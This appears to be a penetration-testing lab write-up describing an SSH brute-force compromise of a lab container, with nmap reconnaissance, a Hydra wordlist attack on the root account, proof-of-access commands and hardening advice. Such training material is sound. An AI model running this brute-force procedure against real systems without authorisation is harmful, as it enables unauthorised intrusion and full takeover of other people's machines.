# 🔐 SSH Brute Force Vulnerability – Full Compromise

## 📌 Summary

During a security assessment on a controlled laboratory environment, an SSH service was identified as exposed and vulnerable to brute force attacks due to weak credentials and insecure configuration.

---

## 🎯 Target Information

* **IP Address:** 172.17.0.2
* **Service:** SSH
* **Port:** 22/tcp
* **Version:** OpenSSH 7.7

---

## 🔍 Reconnaissance

### Nmap Scan

```bash
nmap -p- -sV -O -T4 -sS 172.17.0.2
```

### Result
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.7 (protocol 2.0)
```
<img width="822" height="268" alt="image" src="https://github.com/user-attachments/assets/982aa354-3e50-4162-9bf3-b5c1167fee40" />


* Only SSH service exposed
* Authentication via password enabled

---

## 🧠 Enumeration

Manual testing confirmed that the `root` user exists:

```bash
ssh root@172.17.0.2
```

Response:

```
root@172.17.0.2's password:
```
### Result
<img width="607" height="105" alt="image" src="https://github.com/user-attachments/assets/3159ca28-0db5-4bb1-8963-6a8b29936167" />

This indicates:

* Valid system user
* Password authentication allowed

---

## ⚡ Exploitation

A brute force attack was conducted using Hydra:

```bash
hydra -l root -P /home/kali/Desktop/DockerLabs.es/rockyou.txt ssh://172.17.0.2
```
### Result
<img width="940" height="262" alt="image" src="https://github.com/user-attachments/assets/528f4c3d-7330-4de7-b584-c0aa7bec006a" />

* Valid credentials were discovered
* Successful authentication as `root`

---
## 💻 Post-Exploitation (Proof of Access)

After obtaining valid credentials, access to the system was confirmed via SSH:

```bash
ssh root@172.17.0.2
```

Once authenticated, command execution was verified:

```bash
whoami
```

```
root
```

```bash
id
```

```
uid=0(root) gid=0(root) groups=0(root)
```

```bash
hostname
```

```
8fe0ad8f9aa2
```
### Result
<img width="614" height="332" alt="image" src="https://github.com/user-attachments/assets/8e860a72-e85f-4bb1-86ba-fbffa4fbf7c0" />



This confirms:

* Root-level privileges (`uid=0`)
* Full control over the target system
* Ability to execute arbitrary commands

---


## 🔥 Impact

* Full system compromise achieved
* Root-level access granted
* Attacker gains:

  * Complete control over the system
  * Ability to read, modify, or delete any file
  * Potential lateral movement

---

## 🛡️ Mitigation

To prevent this type of attack:

* Disable root login via SSH:

  ```
  PermitRootLogin no
  ```

* Disable password authentication:

  ```
  PasswordAuthentication no
  ```

* Use SSH key-based authentication only

* Implement account lockout mechanisms (e.g., fail2ban)

* Enforce strong password policies

---

## 📊 Severity

**Critical**

---

## 🧾 Conclusion

The system is critically vulnerable due to weak SSH credentials and insecure configuration.
An attacker can gain full administrative access using brute force techniques without exploiting complex vulnerabilities.

This highlights the importance of:

* Strong authentication controls
* Proper service hardening
* Continuous security monitoring

---

## 🚀 Notes

Although a known CVE related to SSH enumeration exists, this compromise was achieved through:

* Weak credentials
* Misconfiguration

Not through direct exploitation of a specific vulnerability.

---
